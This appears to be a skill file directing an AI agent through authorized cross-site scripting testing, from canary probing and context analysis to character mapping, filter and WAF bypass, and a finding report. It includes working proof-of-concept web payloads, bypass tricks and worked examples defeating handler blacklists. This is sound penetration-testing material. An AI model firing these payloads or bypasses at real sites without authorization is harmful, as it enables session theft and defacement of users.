---
name: xss-testing
description: Systematic XSS vulnerability testing methodology for authorized penetration testing. Use when the lead agent identifies an attack surface as potentially viable for XSS testing. Covers reflected, stored, and DOM-based XSS with context-aware analysis, incremental payload building, intelligent filter bypass, and reasoning-driven approach. Requires explicit authorization before testing.
---

# XSS Testing Methodology

Systematic methodology for testing Cross-Site Scripting vulnerabilities during authorized penetration testing. This skill emphasizes **reasoning over pattern matching** — understand the context, probe systematically, build payloads intelligently.

## Core Principles

1. **UNDERSTAND** the context before attempting payloads
2. **PROBE** systematically with benign input first, then batch characters, then granular if needed
3. **REASON** about what's needed vs what's allowed
4. **BUILD** payloads incrementally from components
5. **BALANCE** payloads properly (closing tags, quotes, brackets)
6. **CONSULT** reference files when encountering blocks

---

## Mandatory Reference File Usage

**When you encounter filtering, you MUST consult the appropriate reference file:**

| When This Happens | You MUST Read |
|-------------------|---------------|
| Characters are blocked/encoded | `patterns-encodings.md` |
| HTML tags are stripped | `patterns-tags.md` |
| Event handlers are stripped | `patterns-handlers.md` |
| Function names are stripped | `patterns-functions.md` |
| WAF error page / generic block | `patterns-waf.md` |
| JSON/XML/XSLT response format | `contexts.md` |
| Input in DOM but not HTTP response | `dom-xss.md` |

**These files contain bypass techniques and alternatives. Do NOT skip them when blocked.**

---

## Phase 1: Identify User-Controllable Inputs

Enumerate ALL potential injection points, not just obvious parameters.

**Check for:**
- GET parameter values
- POST parameter values
- **Parameter names themselves** (often reflected in errors)
- HTTP Headers: `Referer`, `User-Agent`, `X-Forwarded-For`, `Cookie`
- URL path segments
- File upload filenames

**Action:** List all user-controllable inputs for the target endpoint.

---

## Phase 2: Test Reflection with BENIGN Input

**Critical: Use alphanumeric canary only — NO special characters yet.**

Inject a unique benign string: `xsstest7a3b9` (or similar random alphanumeric)

**Why benign first?**
If special characters are present, the application might:
- Filter the entire input
- Return an error page
- Behave completely differently

This would falsely indicate "no reflection." Benign input confirms reflection EXISTS before testing what's filtered.

**Test one parameter at a time** to isolate behavior.

### Step 2a: Confirm Reflection Exists

**Decision:** Is the benign canary reflected in the response?
- **NO** → Move to next input, loop back
- **YES** → Proceed to count reflection points

### Step 2b: Count ALL Reflection Points (Critical!)

**Before proceeding further, count exactly how many times the canary appears in the response.**

Search the entire response for your canary and document:
```
REFLECTION POINT ANALYSIS
=========================
Total reflections found: [number]

Reflection #1:
  Position: [line number or description]
  Context: [HTML body / attribute / JS string / etc.]
  Surrounding: [what's before and after]

Reflection #2:
  Position: [line number or description]
  Context: [HTML body / attribute / JS string / etc.]
  Surrounding: [what's before and after]

[...continue for all reflections]
```

### Step 2c: Prioritize Reflection Points

If multiple reflections exist, **prioritize by likelihood of success:**

| Priority | Context | Why |
|----------|---------|-----|
| 1st | HTML body (between tags) | Easiest breakout, just need `<>` |
| 2nd | Unquoted attribute | Only need space |
| 3rd | Single-quoted attribute | Need `'` |
| 4th | Double-quoted attribute | Need `"` |
| 5th | JavaScript string | Need quote + valid JS |
| 6th | URL/href context | May need protocol |
| 7th | Inside `<script>` block | Complex, may need `</script>` |

**Select the highest-priority (easiest) reflection point to attack first.**

If that reflection point is exhausted without success, move to the next priority reflection point.

---

## Phase 3: Classify XSS Type

Based on where reflection appears:

| Reflection Location | Classification | Notes |
|---------------------|----------------|-------|
| Same HTTP response | **Reflected XSS** | Input echoed immediately |
| Different/later response | **Stored XSS** | Input persists in storage |
| Not in HTTP response, but in DOM | **DOM-based XSS** | Client-side JS processing → See `dom-xss.md` |

**For Stored XSS:** Identify both the storage endpoint (where input is submitted) and display endpoint(s) (where input is rendered).

### Multiple Reflection Points

If the same input appears in multiple locations:

1. **Analyze each independently** — each may have different context and filtering
2. **Note the contexts** — Location A might be HTML body, Location B might be JS string
3. **Consider cross-location attacks** — breaking syntax in one location may enable exploitation in another
4. **Test each separately first** — then consider combined approaches

---

## Phase 4: Identify Reflection Context

The context determines which characters are needed for breakout and what payload structure is viable.

Examine what's **immediately before and after** the reflected canary in the raw response source.

### Standard HTML Contexts

| Context | Example | Breakout Goal | Critical Characters |
|---------|---------|---------------|---------------------|
| HTML Element | `<div>CANARY</div>` | Inject new tag or event | `<` `>` `"` `=` |
| Attribute (double quote) | `<input value="CANARY">` | Close quote, add handler/tag | `"` then `>` or event |
| Attribute (single quote) | `<input value='CANARY'>` | Close quote, add handler/tag | `'` then `>` or event |
| Attribute (unquoted) | `<input value=CANARY>` | Space + new attribute | space `=` |
| URL/href | `<a href="CANARY">` | javascript: protocol or breakout | `:` or quote |
| HTML Comment | `<!-- CANARY -->` | Close comment | `-->` |
| Script block | `<script>CANARY</script>` | Direct JS or close script | `</script>` or valid JS |

### JavaScript Contexts

| Context | Example | Breakout Goal | Critical Characters |
|---------|---------|---------------|---------------------|
| JS String (double) | `var x = "CANARY";` | Close string, inject code | `"` `;` `(` `)` |
| JS String (single) | `var x = 'CANARY';` | Close string, inject code | `'` `;` `(` `)` |
| JS Template Literal | `` var x = `CANARY`; `` | Template expression | `${` `}` `` ` `` |
| Direct in JS | `<script>func(CANARY)</script>` | Inject valid JS | depends on position |

### Special Contexts (XML, JSON, XSLT)

For detailed handling of these contexts, see `contexts.md`.

**JSON Response:**
- Key question: How is JSON consumed?
- If rendered as HTML (wrong Content-Type) → break JSON, inject HTML
- If parsed by JS → exploit how data is inserted into DOM later
- Critical chars: `"` `}` `<`

**XML Response:**
- Stricter parsing than HTML
- Try CDATA breakout: `]]>`
- XML entity encoding differs from HTML
- Critical chars: `<` `>` `/` `]`

**XSLT Context:**
- Can inject malicious XSLT elements
- XPath injection possible
- Critical chars: `"` `'` `<` `/`

**Output:** List of characters REQUIRED for breakout based on identified context.

---

## Phase 5: Test Special Characters (Batch First, Then Granular)

### Step 5a: Batch Character Test

**First, test ALL critical characters at once:**

```
test"';/<>()!`-{}=
```

Send this as input and analyze the response:

**If ALL characters reflect as-is:**
→ Minimal filtering. Proceed directly to payload building (Phase 6).

**If response is blocked/error page:**
→ Likely WAF or strict filter. Consult `patterns-waf.md`. Then proceed to granular testing.

**If SOME characters are missing/encoded:**
→ Proceed to Step 5b for granular testing to identify exactly which.

### Step 5b: Granular Character Testing (Only If Needed)

When batch test shows partial filtering, test characters individually to build precise map:

```
test"    → reflected?
test'    → reflected?
test<    → reflected?
test>    → reflected?
test(    → reflected?
test)    → reflected?
...
```

**Focus on characters needed for YOUR context:**
- HTML body: Need `<` `>` primarily
- Attribute: Need quote type (`"` or `'`) and possibly `>`
- JavaScript: Need quote type, `;`, `(`, `)`

### Step 5c: Build Character Map

```
ALLOWED (reflect as-is): [list]
ENCODED (converted):     [list with what they become]
STRIPPED (removed):      [list]
BLOCKED (causes error):  [list]
```

### Step 5d: If Required Characters Are Blocked

When a needed character is blocked, **you MUST consult `patterns-encodings.md`** for bypass techniques.

**Do not skip this step. The reference file contains encoding techniques that may bypass the filter.**

**Quick encoding attempts (see reference file for full list):**
1. URL encoding: `%22` for `"`
2. Double URL encoding: `%2522`
3. HTML entities: `&#34;` or `&#x22;` or `&quot;`
4. Unicode (JS context): `\u0022`

**Methodology:**
1. Test if encoded form is decoded by application
2. Check if decoded BEFORE or AFTER filter
3. If decoded after filter → bypass works

**Stop Condition:** After 4-5 encoding variants fail for a character → accept it's truly blocked, adapt payload structure to avoid needing that character.

---

## Phase 6: Payload Building (Smart Discovery + Balancing)

### Step 6a: Identify What You Need

Based on context, determine the payload structure:

| Context | Need | Example Structure |
|---------|------|-------------------|
| HTML body | New tag with event | `<tag event=code>` |
| Attribute (quoted) | Break quote + event OR new tag | `" event=code` or `"><tag event=code>` |
| Attribute (unquoted) | Space + event | ` event=code` |
| JavaScript string | Break string + code | `";code//` or `'-code-'` |
| href/src | Protocol | `javascript:code` |

### Step 6b: Smart Tag Discovery (If Needed)

**Don't test full payloads for each tag. Test tag names first:**

**Test 3 common tags:**
```
script    → reflected?
img       → reflected?
svg       → reflected?
```

**If all common blocked, you MUST consult `patterns-tags.md`** for less-common alternatives.

Then test 3 less-common tags from the reference:
```
body      → reflected?
details   → reflected?
input     → reflected?
```

**The reference file `patterns-tags.md` contains:**
- Tags that auto-fire vs need interaction
- Rarely-filtered tag alternatives
- Character requirements for each tag
- Tags that work without parentheses

**Stop Condition:** After testing 6 tags (3 common + 3 from reference) with no success → try `javascript:` protocol approach or consult `patterns-waf.md`.

### Step 6c: Smart Handler Discovery (If Needed)

**Test handler acceptance, not full payloads:**

**Test 3 common handlers:**
```
test" onmouseover    → reflected?
test" onerror        → reflected?
test" onload         → reflected?
```

**If blocked, test with fake handler to understand filter:**
```
test" onabc          → reflected?
```
- If `onabc` allowed → Blacklist filter. **MUST consult `patterns-handlers.md`** for uncommon handlers not in blacklist.
- If `onabc` blocked → Pattern filter blocks all `on*`. Try encoding/obfuscation or `javascript:` protocol.

**The reference file `patterns-handlers.md` contains:**
- Handlers that auto-fire without interaction
- Rarely-filtered handler alternatives  
- Handler + tag compatibility information
- Encoding techniques for handlers

**Stop Condition:** After fake handler test shows all `on*` blocked → skip handlers entirely, use `javascript:` protocol.

### Step 6d: Build the Payload Incrementally

Once you know which tag and handler work, build incrementally:

```
Step 1: <img           → reflected?
Step 2: <img src       → reflected?
Step 3: <img src=x     → reflected?
Step 4: <img src=x onerror   → reflected?
Step 5: <img src=x onerror=  → reflected?
Step 6: <img src=x onerror=alert  → reflected? (or alternative function)
Step 7: <img src=x onerror=alert(1)  → reflected?
Step 8: <img src=x onerror=alert(1)> → complete
```

This pinpoints exactly where filtering occurs if payload fails.

### Step 6e: Payload Balancing (CRITICAL!)

**A payload that breaks out but doesn't balance is a syntax error.**

**Balancing Rules:**

| What You Open | Must Close/Balance |
|---------------|-------------------|
| `"` (break attribute) | May need `"` at end to prevent syntax error |
| `'` (break attribute) | May need `'` at end |
| `<tag` | Need `>` to complete tag |
| `</script>` (break out) | Content after is now HTML |
| `{` in JS | May need `}` |
| `(` in JS | Need `)` |

**Balancing Examples:**

**Attribute context:** `<input value="INJECTION">`
```
Bad:  "><script>alert(1)</script>
      Results in: <input value=""><script>alert(1)</script>">
      The trailing "> causes issues

Good: "><script>alert(1)</script><x y="
      Results in: <input value=""><script>alert(1)</script><x y="">
      Clean syntax, no dangling quotes
```

**JavaScript context:** `var x = "INJECTION";`
```
Bad:  ";alert(1)//
      May work, but leaves potential issues

Good: ";alert(1);//
      Or: "-alert(1)-"
      Cleaner, handles the original quote
```

**Always verify:** After building payload, check the final HTML/JS syntax is valid.

### Step 6f: Function Selection

If `alert` is blocked, first try basic alternatives:
```
confirm(1)
prompt(1)
console.log(1)
```

**If these are also blocked, you MUST consult `patterns-functions.md`** for advanced alternatives.

**The reference file contains:**
- Alternative proof-of-execution functions
- Parentheses-free alternatives (template literals like `alert`1``)
- Encoded/obfuscated function names
- Ways to call functions without using their names directly

---

## Phase 7: Filter Analysis & Bypass (MUST Use Reference Files)

When payload building encounters blocks, analyze the filter type and **consult the appropriate reference file.**

### Filter Type → Mandatory Reference File

**You MUST read the appropriate reference file when encountering these blocks:**

| Symptom | Filter Type | MUST Read |
|---------|-------------|-----------|
| Specific characters encoded/stripped | Character filter | `patterns-encodings.md` |
| Tag names stripped (e.g., `<script>` → `<>`) | Tag blacklist | `patterns-tags.md` |
| Event handlers stripped | Handler blacklist | `patterns-handlers.md` |
| Function names stripped | Function blacklist | `patterns-functions.md` |
| Generic block page / WAF error | WAF | `patterns-waf.md` |
| Keywords blocked but components allowed | Pattern filter | Break pattern with encoding/comments |

**Do not attempt random bypasses. The reference files contain tested techniques.**

### The "Invalid Variant" Test

To understand if filter is blacklist or pattern-based:

**For handlers:**
- Test `onabc` (fake handler)
- Allowed → Blacklist (try uncommon real handlers)
- Blocked → Pattern (try encoding, different approach)

**For tags:**
- Test `<xss>` (fake tag)
- Allowed → Blacklist (try uncommon real tags)
- Blocked → Pattern (try encoding, protocol approach)

**For functions:**
- Test `xyzfunc(` (fake function pattern)
- Allowed → Specific functions blacklisted
- Blocked → Pattern matching on function call syntax

### Bypass Techniques Quick Reference

**Encoding (see `patterns-encodings.md`):**
```
URL: %3C %3E %22 %27
HTML: &#60; &#x3c; &lt;
Unicode: \u003c (JS context)
Double: %253C
```

**Obfuscation:**
```
Case: <ScRiPt>, OnMoUsEoVeR
Whitespace: <img%09src=x%09onerror=...>
Null byte: <scr%00ipt>
Comments: <scr<!---->ipt>
```

**Alternatives (see respective reference files):**
- Different tags: `patterns-tags.md`
- Different handlers: `patterns-handlers.md`
- Different functions: `patterns-functions.md`

### Stop Conditions

| Situation | After | Action |
|-----------|-------|--------|
| Encoding bypass attempts | 4-5 failures per char | Accept char blocked, adapt structure |
| Tag alternatives | 6 tags tested (3 common + 3 uncommon) | Try javascript: protocol |
| Handler alternatives | Fake handler blocked | Use javascript: protocol |
| Function alternatives | 4-5 alternatives fail | Use DOM modification as proof |
| All approaches | Exhausted | Document as heavily mitigated |

---

## Phase 8: Iterate and Refine

### Iteration Loop

```
Payload reflected completely?
├── YES → Test execution (Phase 9)
└── NO  → Identify what's blocked
          → Consult appropriate reference file
          → Apply bypass technique
          → Rebuild payload
          → Test again
```

### When Moving Between Reflection Points

If current reflection point is exhausted (all bypass attempts failed):

1. **Document** what was tried and what failed
2. **Move** to next priority reflection point (from Phase 2c)
3. **Repeat** character testing and payload building for new context
4. Each reflection point may have different filtering

### Reference Files Summary

**Always consult these when encountering blocks:**

| Blocked Element | Reference File |
|-----------------|----------------|
| Characters (`<`, `"`, etc.) | `patterns-encodings.md` |
| HTML tags | `patterns-tags.md` |
| Event handlers | `patterns-handlers.md` |
| JS functions | `patterns-functions.md` |
| WAF/generic blocks | `patterns-waf.md` |
| JSON/XML/XSLT context | `contexts.md` |
| DOM-based (no server reflection) | `dom-xss.md` |

---

## Phase 9: Validation

### Confirm Execution
Test the payload in a browser environment:
- Does JavaScript actually execute?
- Check browser console for errors

### Validate Impact
If execution confirmed:
- Can access `document.domain`? (proves execution context)
- Can access `document.cookie`? (session theft potential)
- Can manipulate DOM? (defacement, phishing potential)
- Is there a Content Security Policy? Can it be bypassed?

### If Execution Fails
Diagnose the failure:
- **Syntax error** — Payload malformed, balance tags/quotes
- **CSP blocking** — Check headers, may need CSP bypass
- **Browser XSS protection** — Try different browser or bypass
- **Reflected but not executable** — Wrong context, reassess

Return to Phase 6 with diagnostic information.

---

## Phase 10: Documentation

Report findings in structured format:

```
XSS FINDING REPORT
==================
TYPE: [Reflected | Stored | DOM-based]

LOCATION:
  URL: [full URL]
  Parameter/Input: [name]
  Reflection Point: [where in response]

CONTEXT:
  Response Format: [HTML | JSON | XML | etc.]
  Injection Context: [HTML body | attribute | JS string | etc.]

CHARACTER ANALYSIS:
  Allowed: [list]
  Encoded: [list]
  Blocked: [list]

FILTER ANALYSIS:
  Filter Type: [character | pattern | blacklist | WAF]
  Trigger: [what specifically was blocked]
  Bypass Used: [technique that worked]

PAYLOAD:
  Working Payload: [exact payload]
  Execution Trigger: [auto | user interaction required]

IMPACT:
  Cookie Access: [yes | no | httpOnly]
  Session Hijack Potential: [assessment]
  CSP: [present | absent | bypassable]

REMEDIATION:
  Root Cause: [why vulnerability exists]
  Recommended Fix: [specific remediation]
```

---

## Few-Shot Examples

### Example 1: Batch Testing with Tag Discovery

**SCENARIO:** Testing a search parameter that reflects user input.

**THINKING:** First confirm reflection with benign input, then count reflection points.

**ACTION:** Send `search=xsstest123`

**RESULT:** Response contains canary in 2 locations:
1. `<div class="results">xsstest123</div>` — HTML body context
2. `<input type="hidden" value="xsstest123">` — Attribute context

**THINKING:** Two reflections! HTML body context (Priority 1) is easier than attribute (Priority 4). I'll focus on the HTML body first.

**ACTION:** Batch test all special chars: `search=test"';/<>()!`-{}=`

**RESULT:** Response shows `test"';/<>()!`-{}=` — ALL characters reflected! Minimal filtering.

**THINKING:** Great, I have all chars I need. For HTML body, I need a tag. Let me test which tags are allowed.

**ACTION:** Test common tags: `search=<script`

**RESULT:** Response shows `<` — the word "script" was stripped!

**ACTION:** Test next common tag: `search=<img`

**RESULT:** Response shows `<img` — img tag is allowed!

**THINKING:** `<img>` works. Now test if event handlers work.

**ACTION:** `search=<img onerror`

**RESULT:** Response shows `<img onerror` — handler allowed!

**THINKING:** Looking good. Let me build incrementally then check function.

**ACTION:** `search=<img src=x onerror=alert`

**RESULT:** Response shows `<img src=x onerror=` — "alert" was stripped!

**THINKING:** "alert" is blacklisted. Per `patterns-functions.md`, I should try alternatives.

**ACTION:** `search=<img src=x onerror=confirm(1)>`

**RESULT:** Response shows complete payload. Testing in browser — JavaScript executes!

**CONCLUSION:** 
- Two reflection points found, attacked easier one (HTML body)
- Batch test showed all chars allowed
- `<script>` tag blocked, `<img>` allowed
- `alert` function blocked, `confirm` works
- Working payload: `<img src=x onerror=confirm(1)>`

---

### Example 2: Handling Encoded Characters with Alternative Breakout

**SCENARIO:** Testing a comment field that reflects in an HTML attribute.

**THINKING:** Confirm reflection first with benign input.

**ACTION:** Send `comment=xsstest456`

**RESULT:** Response contains `<input type="hidden" value="xsstest456">` — reflection in double-quoted attribute.

**THINKING:** I'm inside a double-quoted attribute. I need `"` to break out. Let me test.

**ACTION:** Send `comment=test"`

**RESULT:** Response contains `value="test&quot;"` — double quote is HTML encoded!

**THINKING:** Direct quote doesn't work. Let me try URL encoding.

**ACTION:** Send `comment=test%22`

**RESULT:** Response contains `value="test&quot;"` — still encoded. The application decodes URL encoding then HTML encodes the quote.

**THINKING:** What about double URL encoding?

**ACTION:** Send `comment=test%2522`

**RESULT:** Response contains `value="test%22"` — it shows `%22` literally. Single decode happened but no HTML encoding of the result. Not useful.

**THINKING:** Let me check other characters. Maybe I can close the tag without breaking the quote first.

**ACTION:** Send `comment=test>`

**RESULT:** Response contains `value="test>"` — greater-than is not encoded!

**ACTION:** Send `comment=test<`

**RESULT:** Response contains `value="test<"` — less-than is also not encoded!

**THINKING:** So I have `<` and `>` but not `"`. In attribute context, the structure is `<input ... value="INJECTION">`. If I inject `><img src=x onerror=...>`, browser might parse `>` as closing the input tag prematurely.

**ACTION:** Send `comment=><img src=x onerror=confirm(1)>`

**RESULT:** Response contains `value="><img src=x onerror=confirm(1)>"` — payload reflected.

**ACTION:** Test in browser.

**RESULT:** JavaScript executes! The browser parses the `>` as closing the input tag, then renders the img tag.

**CONCLUSION:** While quotes are encoded, `<` and `>` are not. Payload breaks out of the tag structure without needing to close the attribute properly. Working payload: `><img src=x onerror=confirm(1)>`

---

### Example 3: Identifying Blacklist vs Pattern Filter

**SCENARIO:** Testing a name parameter where event handlers are being stripped.

**THINKING:** Confirm reflection, identify context.

**ACTION:** Send `name=xsstest789`

**RESULT:** Response contains `<span id="user">xsstest789</span>` — HTML body context.

**ACTION:** Test characters: `name=test<>"`

**RESULT:** Response contains `test<>"` — all basic characters allowed.

**ACTION:** Build incrementally: `name=<img src=x onerror=confirm(1)>`

**RESULT:** Response contains `<img src=x =confirm(1)>` — "onerror" was stripped!

**THINKING:** The handler was stripped but not the whole payload. Let me test other handlers.

**ACTION:** Send `name=<img src=x onload=confirm(1)>`

**RESULT:** Response contains `<img src=x =confirm(1)>` — "onload" also stripped.

**ACTION:** Send `name=<img src=x onclick=confirm(1)>`

**RESULT:** Response contains `<img src=x =confirm(1)>` — "onclick" also stripped.

**THINKING:** Common handlers are being stripped. Is it a blacklist of known handlers, or does it block all `on*` patterns? This is a key question. Let me test with a fake handler that doesn't exist.

**ACTION:** Send `name=<img src=x onabc=confirm(1)>`

**RESULT:** Response contains `<img src=x onabc=confirm(1)>` — fake handler "onabc" is allowed!

**THINKING:** It's a blacklist, not a pattern match! The filter only blocks known event handlers. I need to find a real but uncommon handler that's not in their blacklist.

**ACTION:** Send `name=<img src=x onpointerenter=confirm(1)>`

**RESULT:** Response contains `<img src=x onpointerenter=confirm(1)>` — this handler is not in their blacklist!

**ACTION:** Test in browser (need to trigger pointer enter event by moving mouse over element).

**RESULT:** Moving mouse over the image triggers JavaScript execution.

**CONCLUSION:** Filter uses a blacklist of common event handlers (onerror, onload, onclick, etc.) but misses less common ones like onpointerenter. Working payload: `<img src=x onpointerenter=confirm(1)>` (requires mouse interaction)

**FURTHER OPTIMIZATION:** For auto-execution without user interaction, could check `patterns-handlers.md` for handlers that auto-fire, filtering out any that match the blacklist pattern (common handlers). Candidates might include: `onanimationend`, `ontransitionend` with CSS, or `onfocus` with `autofocus` attribute.

---

## DOM-based XSS

For DOM-based XSS testing methodology, including source/sink identification, data flow tracing, and specific few-shot examples, see `dom-xss.md`.

**When to suspect DOM XSS:**
- Benign canary is NOT in HTTP response
- But canary appears in rendered page/DOM
- URL contains fragments (#) that affect page content
- JavaScript processes URL parameters client-side

---

## Quick Reference: File Index

| File | Contents | When to Consult |
|------|----------|-----------------|
| `dom-xss.md` | DOM XSS methodology + examples | When input isn't in HTTP response but appears in DOM |
| `contexts.md` | XML, XSLT, JSON context details | When dealing with non-HTML response formats |
| `patterns-tags.md` | Alternative HTML tags | When common tags (script, img, svg) are blocked |
| `patterns-handlers.md` | Event handler alternatives | When common handlers (onerror, onload) are blocked |
| `patterns-functions.md` | JS function alternatives | When common functions (alert, confirm) are blocked |
| `patterns-encodings.md` | Encoding techniques | When characters are blocked or encoded |
| `patterns-waf.md` | WAF-specific bypasses | When WAF/firewall is detected |

**How to use reference files:**
1. Reference files contain PATTERNS to understand, not payloads to copy
2. Filter options based on your character constraints
3. Build your own payload using the techniques
4. Follow stop conditions — don't endlessly try blocked approaches
